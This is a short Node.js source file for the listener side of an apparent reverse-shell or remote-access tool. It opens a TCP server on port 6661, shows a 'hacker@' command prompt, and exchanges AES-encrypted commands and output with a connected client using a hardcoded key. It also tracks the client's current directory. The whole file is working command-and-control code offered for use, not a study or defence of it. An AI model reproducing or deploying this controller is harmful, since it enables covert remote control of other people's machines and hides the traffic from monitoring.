const net = require("net");
const readline = require("readline-sync");
const CryptoJS = require("crypto-js");
const c = require("ansi-colors")

console.clear();

function decrypt(text) {
    let bytes = CryptoJS.AES.decrypt(text, "hackingworld");
    let msg = bytes.toString(CryptoJS.enc.Utf8);
    return msg;
}

function encrypt(text) {
    let msg = CryptoJS.AES.encrypt(text, "hackingworld").toString();
    return msg;
}

const LPORT = 6661;
const LHOST = "127.0.0.1";

const server = net.createServer();

var drt = null;

server.on("connection", (sock) => {
    sock.setEncoding("utf8");
    console.log("Client Connected!");
    sock.on("data", (data) => {
        if(decrypt(data).indexOf("open directory:") != -1) {
            drt = decrypt(data).replace("open directory:", "").trim()
        }
    
        console.log(decrypt(data));
        var msg = readline.question(c.bold(`hacker@${sock.address()["address"].replace("::ffff:", "")} ${c.blue(drt)}\n-$ `));
        sock.write(encrypt(msg));
        console.log();
    });
});

server.listen(LPORT, () => {
    console.log(`escutando na porta: ${LPORT}`);
});